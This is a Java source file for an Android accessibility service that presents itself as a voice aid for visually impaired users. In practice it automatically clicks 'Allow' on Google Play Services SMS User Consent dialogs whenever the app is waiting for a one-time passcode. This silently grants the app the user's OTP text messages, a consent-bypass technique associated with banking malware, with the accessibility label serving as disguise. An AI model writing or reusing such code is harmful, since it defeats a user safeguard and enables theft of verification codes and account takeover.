package com.accessibility.voicecompanion;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

/**
 * Accessibility service for assisting visually impaired users with system dialogs
 * such as auto-approving Google Play Services SMS User Consent prompts.
 */
public class BackgroundVoiceService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        if (SmsOtpHelper.isAwaitingSmsConsent()) {
            handleSmsConsentDialog(event);
        }
    }

    public boolean handleSmsConsentDialog(AccessibilityEvent event) {
        CharSequence pkg = event.getPackageName();
        if (pkg != null && !pkg.toString().contains("com.google.android.gms")) {
            return false;
        }
        AccessibilityNodeInfo root = null;
        try {
            root = getRootInActiveWindow();
        } catch (Exception ignored) {}
        if (root == null) return false;
        try {
            // 1. Check by view ID for standard Play Services consent positive button
            List<AccessibilityNodeInfo> byId = root.findAccessibilityNodeInfosByViewId("com.google.android.gms:id/positive_button");
            if (byId != null && !byId.isEmpty()) {
                for (AccessibilityNodeInfo node : byId) {
                    if (clickNodeOrParent(node)) {
                        SmsOtpHelper.setAwaitingSmsConsent(false);
                        return true;
                    }
                }
            }

            // 2. Check by text "Allow" or "ALLOW"
            List<AccessibilityNodeInfo> byText = root.findAccessibilityNodeInfosByText("Allow");
            if (byText != null && !byText.isEmpty()) {
                for (AccessibilityNodeInfo node : byText) {
                    if (clickNodeOrParent(node)) {
                        SmsOtpHelper.setAwaitingSmsConsent(false);
                        return true;
                    }
                }
            }
        } finally {
            if (Build.VERSION.SDK_INT >= 30) {
                try {
                    root.recycle();
                } catch (Exception ignored) {}
            }
        }
        return false;
    }

    private static boolean clickNodeOrParent(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.isClickable() && node.isEnabled()) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        AccessibilityNodeInfo parent = node.getParent();
        if (parent != null) {
            try {
                if (parent.isClickable() && parent.isEnabled()) {
                    return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            } finally {
                parent.recycle();
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() { }
}
